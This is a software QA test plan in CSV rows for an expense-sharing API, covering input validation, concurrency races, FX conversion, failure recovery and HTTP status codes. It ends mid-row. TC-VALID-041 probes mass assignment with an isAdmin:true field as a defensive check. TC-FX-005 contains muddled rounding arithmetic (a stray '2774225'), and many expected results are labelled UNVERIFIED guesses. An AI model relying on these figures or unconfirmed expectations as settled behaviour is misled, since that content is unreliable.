TC-VALID-038,DTO Type Validation,Negative,High,POST /v1/groups/:id/expenses reachable,1. Submit totalAmountMinor as a boolean 'true',totalAmountMinor=true,400 Bad Request: boolean is not a valid type for an integer minor-unit amount.,Section 8 DTO Input Validation,
TC-VALID-039,DTO Type Validation,Negative,Medium,Any POST/PUT JSON endpoint reachable,"1. Submit a request body that is syntactically invalid JSON (e.g. trailing comma, unquoted keys)",Malformed JSON body,"400 Bad Request with a JSON-parse error, before reaching any business logic or DB call.",Section 8 DTO Input Validation,
TC-VALID-040,DTO Type Validation,Negative,Medium,Any POST/PUT JSON endpoint reachable,"1. Submit request with Content-Type: text/plain instead of application/json, body is valid JSON text",Wrong Content-Type header,UNVERIFIED — doc doesn't specify Content-Type enforcement; expected 400/415 Unsupported Media Type; confirm with dev.,Section 8 DTO Input Validation,
TC-VALID-041,DTO Type Validation,Negative,Medium,POST /v1/groups/:id/expenses reachable,"1. Submit request body with an UNKNOWN extra field, e.g. isAdmin:true, alongside valid expense fields",Extra unexpected field isAdmin=true,"The unrecognized field must be stripped/ignored by whitelist validation (NestJS ValidationPipe with forbidNonWhitelisted or similar) — it must NOT be able to escalate privileges or set unintended entity fields; UNVERIFIED whether forbidNonWhitelisted causes a hard 400 vs. silent stripping, confirm with dev.",Section 8 DTO Input Validation - ValidationPipe,Mass-assignment / privilege-escalation defense check
TC-VALID-042,DTO Type Validation,Boundary,Medium,POST /v1/groups/:id/expenses reachable,"1. Submit currencyCode='inr' (lowercase, valid letters but wrong case per Money regex /^[A-Z]{3}$/)",currencyCode=inr (lowercase),400 Bad Request: Money.currencyCode validation regex requires uppercase A-Z only; lowercase must be rejected (not auto-uppercased) unless doc states otherwise.,Section 3.1 Money class - currencyCode regex /^[A-Z]{3}$/,
TC-VALID-043,DTO Type Validation,Boundary,Medium,POST /v1/groups/:id/expenses reachable,1. Submit currencyCode='INRX' (4 letters),currencyCode=INRX,400 Bad Request: regex requires exactly 3 letters.,Section 3.1 Money class - currencyCode regex,
TC-VALID-044,Environment Validation,Negative,Critical,Deployment started with DATABASE_URL unset,1. Start the API process without DATABASE_URL configured,Missing required env var,Process terminates immediately at startup with a Zod validation error identifying the missing required field — API never comes up in a partially-configured state.,"Section 8 Environment Validation - Zod schema, process terminates on missing required secrets",
TC-VALID-045,Environment Validation,Negative,Critical,Deployment started with JWT_ACCESS_SECRET shorter than 16 characters,1. Start the API with JWT_ACCESS_SECRET='short',JWT_ACCESS_SECRET too short,Process terminates at startup: Zod schema enforces string(min 16) for JWT secrets.,Section 1 env vars JWT_ACCESS_SECRET (min 16),
TC-VALID-046,Environment Validation,Boundary,Medium,PORT env var set to a non-numeric value,1. Start the API with PORT='abc',PORT=abc,Process terminates at startup: Zod number validation fails for PORT.,Section 1 env vars PORT,
TC-CONC-001,Concurrency - Simultaneous Settlement,Concurrency,Critical,A owes B ₹1000; SettlementIntentEntity state=proof_submitted,1. Fire two simultaneous POST .../confirm calls from B's two devices at the same instant,Parallel confirm race,"Exactly one call succeeds (200, ledger posted once, A's balance to B reduced by exactly ₹1000); the other fails with 409 — verified via database transaction (QueryRunner) row-level locking; balance must NEVER be double-reduced.",Section 8 Database Transactions - atomic QueryRunner/EntityManager.transaction,Highest-priority money-safety concurrency case
TC-CONC-002,Concurrency - Simultaneous Expense Edit,Concurrency,Critical,Expense exists at version=1; two admins B and C both open the edit screen simultaneously,"1. B submits PUT /v1/expenses/:id changing totalAmountMinor to 5000 (based on version=1)
2. C submits PUT /v1/expenses/:id changing totalAmountMinor to 8000 (also based on stale version=1) a moment later",Two concurrent edits based on the same starting version,"UNVERIFIED — doc doesn't state whether ExpenseProjectionEntity.version is used for optimistic-locking rejection of the second stale-based write, or whether last-write-wins applies; expected (best-guess, given version field exists) the second write is rejected with 409 'stale version, please refresh'; confirm with dev.",Section 4.3 ExpenseProjectionEntity.version,Known gap: optimistic locking policy for expense edits undocumented
TC-CONC-003,Concurrency - Simultaneous Group Join,Concurrency,Medium,Group has capacity/no documented member cap; two different new users hit the same inviteCode simultaneously,1. Users D and E simultaneously POST /v1/join/:inviteCode with the same code,"Parallel joins, same code",Both D and E successfully become members (no artificial serialization needed since each join creates an independent GroupMembershipEntity row) — verify no duplicate-key DB errors surface to either client.,Section 4.2 GroupMembershipEntity,
TC-CONC-004,Concurrency - Double Expense Submit,Concurrency,Critical,User double-clicks 'Save' on the expense form due to UI lag (no idempotency key sent by a buggy/old client),1. Fire two near-simultaneous POST /v1/groups/:id/expenses with identical body and NO x-idempotency-key header,"Double-click submit, no idempotency key",Both requests are processed independently by design (idempotency depends on the header being present) — TWO expenses are created; this test documents actual behavior and flags it for a product decision on making idempotency-key mandatory client-side.,Section 8 Idempotency Control,"UX/product gap: idempotency-key is opt-in, not enforced server-side"
TC-CONC-005,Concurrency - Balance Read During Write,Concurrency,High,An expense-creation transaction is mid-flight (ledger postings being written),"1. While the write transaction is in progress, a different client calls GET /v1/groups/:id to read balances",Read during in-flight write,"The reading client sees EITHER the fully-pre-transaction state OR the fully-post-transaction state — never a partially-posted intermediate state, per Postgres transaction isolation (atomic QueryRunner).",Section 8 Database Transactions - atomic,
TC-CONC-006,Concurrency - Recurring Job Overlap,Concurrency,High,Two cron triggers for the same recurring config fire within the same second (e.g. duplicate scheduler instances in a multi-pod deployment),1. Simulate two near-simultaneous authenticated calls to the recurring-expense job endpoint for the same recurringConfigId,Duplicate concurrent job triggers,"Only ONE occurrence is generated for the period — UNVERIFIED whether this is enforced via a DB unique constraint on (recurringConfigId, periodDate) or explicit locking; confirm with dev.",Section 6 Background Jobs / Cron,Known gap: multi-pod job-overlap protection undocumented
TC-CONC-007,Concurrency - Ghost Claim Race,Concurrency,High,Ghost participant with phone +919000000001 exists; TWO different real users attempt to register with that same phone number nearly simultaneously (e.g. a typo'd invite),1. Fire two near-simultaneous POST /v1/auth/verify-otp completions for the same phone number,"Parallel registration race, same phone","Only ONE UserEntity is created for that phone (unique constraint on phone), and the ghost ParticipantEntity is claimed by exactly that one user; the second registration attempt must fail cleanly (e.g. 409) rather than creating a duplicate user or double-claiming the ghost.",Section 10 Gap #3 Ghost User Claiming; Section 4.1 UserEntity.phoneNumber,
TC-FX-001,Multi-Currency,Happy Path,High,Group defaultCurrencyCode=INR; FX_PROVIDER_DRIVER=frankfurter; expense logged in USD,"1. Create expense totalAmountMinor=10000 (in USD, i.e. $100.00), currencyCode=USD, in an INR-default group",Expense currency=USD in INR group,"200: FxRateSnapshotEntity captured at creation time recording the USD→INR rate; expense stored natively in USD (ledger postings in USD per BalancedPostingSet, which balances per-currency); group summary view converts to INR for display using the captured rate.",Section 10 Gap #2 Multi-Currency FX Settlement Reversals; Section 6 FX Provider - frankfurter,
TC-FX-002,Multi-Currency,Boundary,Critical,Expense created in USD with an FxRateSnapshotEntity capturing rate=83.25 INR/USD; days later the live rate has moved to 85.10,1. Void/reverse the original USD expense after the FX rate has changed,Reversal after rate drift,"UNVERIFIED — doc explicitly flags this as a risk: 'reversing the ledger posting at the historical rate requires strict audit lookup of the original eventId'; test to confirm the reversal uses the ORIGINAL captured rate (83.25), not the current live rate (85.10); confirm exact lookup mechanism with dev.",Section 10 Gap #2 - Multi-Currency FX Settlement Reversals,Directly from source doc's flagged known gap — high priority
TC-FX-003,Multi-Currency,Negative,High,FX_PROVIDER_DRIVER=frankfurter; Frankfurter API (https://api.frankfurter.dev/v1) is unreachable,1. Attempt to create a cross-currency expense while the FX provider is down,FX provider unreachable,UNVERIFIED — Question Log Q3 explicitly asks this: doc states no documented fallback exists; confirm whether the request fails outright (blocking expense creation) or a stale/cached rate is used; recommend a static fallback table per the doc's own recommended action.,Section 11 Question Log Q3,Directly from source doc's open Question Log
TC-FX-004,Multi-Currency,Boundary,Medium,FX_PROVIDER_DRIVER=static,1. Switch driver to 'static' and create a cross-currency expense,FX_PROVIDER_DRIVER=static,200: a fixed/static conversion table is used instead of live Frankfurter rates; verify the static rate is applied consistently and documented somewhere for the operator to configure.,Section 1 env var FX_PROVIDER_DRIVER=static,
TC-FX-005,Multi-Currency,Rounding,High,"Cross-currency settlement: A owes B $33.33 USD equivalent, group summary must show INR","1. Convert $33.33 (3333 minor units) at rate=83.25 to INR for display
2. Verify the conversion uses integer-safe rounding (not floating point display artifacts)","amountMinor=3333 USD, rate=83.25","Converted INR display value = round(3333 * 0.01 * 83.25 * 100) minor units = round(277,472.25) ≈ ₹2,774.72 (2774225 rounds to nearest paisa); verify the exact rounding rule (round-half-up vs banker's rounding) matches whatever RoundingAllocator-style determinism the domain layer uses — UNVERIFIED exact FX rounding rule, confirm with dev.",Section 10 Gap #1 Integer Minor Units vs JS Number Safety (extended to FX conversion),
TC-FX-006,Multi-Currency,Cross-Feature,Medium,Recurring expense configured in USD within an INR-default group,1. Let the recurring job generate 2 monthly occurrences at different points where the live/static FX rate has changed between occurrences,Recurring + FX combined,"UNVERIFIED — doc doesn't specify whether each recurring occurrence captures a FRESH FxRateSnapshotEntity at its own generation time (expected, for accuracy) or reuses the original config's rate; confirm with dev.",Section 2 Recurring Expenses; Section 10 Gap #2,"Cross-feature interaction: recurring + FX, both individually flagged as risk areas"
TC-FX-007,Multi-Currency,Boundary,Medium,Settlement debt-simplification suggestions requested for a group with BOTH INR and USD balances,1. GET /v1/groups/:id/settlements/suggestions on a mixed-currency group,Mixed INR + USD balances,"Per Section 3.4, GreedySettlementOptimizer groups by currencyCode into separate Maps and computes suggestions independently — an INR debtor is never suggested to pay a USD creditor directly; two separate suggestion sets are returned.",Section 3.4 GreedySettlementOptimizer - byCurrency Map,Cross-reference to SETTLE-OPT mixed-currency case
TC-FAIL-001,Failure Recovery,State-Sequence,Critical,Expense-creation request in flight; DB connection drops mid-transaction (simulated via killing the DB connection during the write),1. Trigger an expense creation and simulate a DB connection failure after the EventStoreEntity insert but before LedgerPostingEntity/GroupBalanceProjectionEntity writes complete,Simulated mid-transaction DB failure,"The entire transaction rolls back atomically (QueryRunner/EntityManager.transaction) — NO partial state: neither the EventStoreEntity row, ledger postings, nor projection update should persist; client receives a 5xx error and can safely retry.",Section 8 Database Transactions - atomic PostgreSQL transactions,
TC-FAIL-002,Failure Recovery,State-Sequence,Critical,"Client sends POST /v1/groups/:id/expenses, network drops AFTER server processes and commits the transaction but BEFORE the response reaches the client","1. Simulate this by cutting the client connection post-commit (e.g. via a proxy) while observing server-side state
2. Client, seeing a timeout/no-response, retries the identical request WITHOUT an idempotency key","Network drop after commit, before response; naive client retry","Server-side: the FIRST expense was already committed successfully. Client-side retry (no idempotency key) creates a SECOND, duplicate expense — this documents the real risk of omitting x-idempotency-key and should inform a recommendation that clients always send one for financial mutations.",Section 8 Idempotency Control,Data integrity after failure: highlights importance of client-side idempotency-key usage
TC-FAIL-003,Failure Recovery,State-Sequence,High,"Object storage (S3/MinIO) write succeeds for a receipt image, but the subsequent DB write linking the attachment to the expense fails",1. Simulate a DB failure immediately after a successful S3 upload during receipt attachment,"Orphaned S3 object, failed DB link",UNVERIFIED — doc doesn't specify cleanup/reconciliation for orphaned object-storage files when the corresponding DB write fails; expected: either a compensating delete of the orphaned S3 object or a scheduled cleanup job; confirm with dev.,Section 6 Object Storage,Known gap: no documented saga/compensation pattern for storage+DB two-phase writes
TC-FAIL-004,Failure Recovery,State-Sequence,High,A settlement CONFIRM request is being processed; the ledger-posting step fails after the SettlementIntentEntity.state was already optimistically updated to 'confirmed' in a non-atomic code path (hypothetical failure-mode probe),"1. Simulate a failure between the state-update step and the ledger-posting step, if these are not in the same DB transaction",Simulated partial settlement-confirm failure,"Expected: both the state transition AND ledger posting are wrapped in the SAME atomic transaction (per Section 8's documented pattern), so a failure rolls back the state change too — state must never show 'confirmed' without a corresponding balanced ledger posting; verify this invariant holds.",Section 8 Database Transactions; Section 3.5 Balanced Posting Set,Money-safety invariant: state and ledger must never diverge
TC-FAIL-005,Failure Recovery,Boundary,Medium,CSV import of 100 rows; row 57 has a fatal error,1. Import a 100-row Splitwise CSV where row 57 is malformed,1 bad row among 100,UNVERIFIED — doc doesn't specify partial-success vs. all-or-nothing import semantics (see IMPEXP section); expected an all-or-nothing rollback given the codebase's general preference for atomic transactions elsewhere; confirm with dev.,Section 2 Import/Export,Cross-reference to IMPEXP-003
TC-FAIL-006,Failure Recovery,Concurrency,High,Webhook delivery from a payment gateway arrives while the corresponding SettlementIntentEntity row is locked by a concurrent user-initiated confirm() call,1. Simulate a webhook POST arriving at the exact moment a manual confirm() transaction holds a row lock on the same SettlementIntentEntity,Webhook vs. manual confirm race,"UNVERIFIED — doc doesn't describe lock contention behavior between webhook-driven and user-driven confirmation paths; expected: one waits for the row lock and then finds the state already 'confirmed', returning a no-op/409 rather than double-posting; confirm with dev.",Section 8 Database Transactions,Cross-feature concurrency gap: webhook vs manual settlement paths
TC-API-001,API Status Coverage - POST /v1/auth/request-otp,Negative,High,POST /v1/auth/request-otp is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/auth/request-otp under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/auth/request-otp, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-002,API Status Coverage - POST /v1/auth/request-otp,Negative,Critical,POST /v1/auth/request-otp is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/auth/request-otp under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/auth/request-otp, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-003,API Status Coverage - POST /v1/auth/verify-otp,Negative,High,POST /v1/auth/verify-otp is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/auth/verify-otp under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/auth/verify-otp, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-004,API Status Coverage - POST /v1/auth/verify-otp,Negative,Critical,POST /v1/auth/verify-otp is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/auth/verify-otp under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/auth/verify-otp, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-005,API Status Coverage - POST /v1/auth/verify-otp,Negative,Critical,POST /v1/auth/verify-otp is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/auth/verify-otp under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/auth/verify-otp, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-006,API Status Coverage - POST /v1/auth/google,Negative,Critical,POST /v1/auth/google is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/auth/google under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/auth/google, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-007,API Status Coverage - POST /v1/auth/google,Negative,Critical,POST /v1/auth/google is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/auth/google under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/auth/google, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-008,API Status Coverage - POST /v1/auth/refresh,Negative,Critical,POST /v1/auth/refresh is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/auth/refresh under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/auth/refresh, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-009,API Status Coverage - POST /v1/auth/refresh,Negative,Critical,POST /v1/auth/refresh is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/auth/refresh under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/auth/refresh, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-010,API Status Coverage - POST /v1/auth/logout,Negative,Critical,POST /v1/auth/logout is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/auth/logout under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/auth/logout, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-011,API Status Coverage - POST /v1/auth/logout,Negative,Critical,POST /v1/auth/logout is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/auth/logout under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/auth/logout, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-012,API Status Coverage - POST /v1/groups,Negative,High,POST /v1/groups is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/groups under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/groups, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-013,API Status Coverage - POST /v1/groups,Negative,Critical,POST /v1/groups is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/groups under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/groups, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-014,API Status Coverage - POST /v1/groups,Negative,Critical,POST /v1/groups is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/groups under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/groups, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-015,API Status Coverage - GET /v1/groups,Negative,Critical,GET /v1/groups is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue GET /v1/groups under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","GET /v1/groups, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-016,API Status Coverage - GET /v1/groups,Negative,Critical,GET /v1/groups is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue GET /v1/groups under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","GET /v1/groups, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-017,API Status Coverage - GET /v1/groups/:id,Negative,Critical,GET /v1/groups/:id is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue GET /v1/groups/:id under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","GET /v1/groups/:id, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-018,API Status Coverage - GET /v1/groups/:id,Permission,Critical,"GET /v1/groups/:id is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue GET /v1/groups/:id under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","GET /v1/groups/:id, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-019,API Status Coverage - GET /v1/groups/:id,Negative,High,GET /v1/groups/:id is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue GET /v1/groups/:id under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","GET /v1/groups/:id, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-020,API Status Coverage - GET /v1/groups/:id,Negative,Critical,GET /v1/groups/:id is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue GET /v1/groups/:id under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","GET /v1/groups/:id, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-021,API Status Coverage - POST /v1/groups/:id/members,Negative,High,POST /v1/groups/:id/members is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/groups/:id/members under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/members, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-022,API Status Coverage - POST /v1/groups/:id/members,Negative,Critical,POST /v1/groups/:id/members is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/groups/:id/members under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/members, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-023,API Status Coverage - POST /v1/groups/:id/members,Permission,Critical,"POST /v1/groups/:id/members is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/groups/:id/members under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/members, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-024,API Status Coverage - POST /v1/groups/:id/members,Negative,High,POST /v1/groups/:id/members is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/groups/:id/members under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/members, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-025,API Status Coverage - POST /v1/groups/:id/members,Negative,Critical,POST /v1/groups/:id/members is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/groups/:id/members under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/members, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-026,API Status Coverage - POST /v1/join/:inviteCode,Negative,Critical,POST /v1/join/:inviteCode is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/join/:inviteCode under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/join/:inviteCode, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-027,API Status Coverage - POST /v1/join/:inviteCode,Negative,High,POST /v1/join/:inviteCode is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/join/:inviteCode under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/join/:inviteCode, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-028,API Status Coverage - POST /v1/join/:inviteCode,State-Sequence,High,"POST /v1/join/:inviteCode is reachable and reproducible per its documented preconditions (the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)).","1. Issue POST /v1/join/:inviteCode under conditions that trigger 409: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)
2. Inspect the HTTP status code and response body","POST /v1/join/:inviteCode, condition: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)",Response status = 409 Conflict. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 409 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-029,API Status Coverage - POST /v1/join/:inviteCode,Negative,Critical,POST /v1/join/:inviteCode is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/join/:inviteCode under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
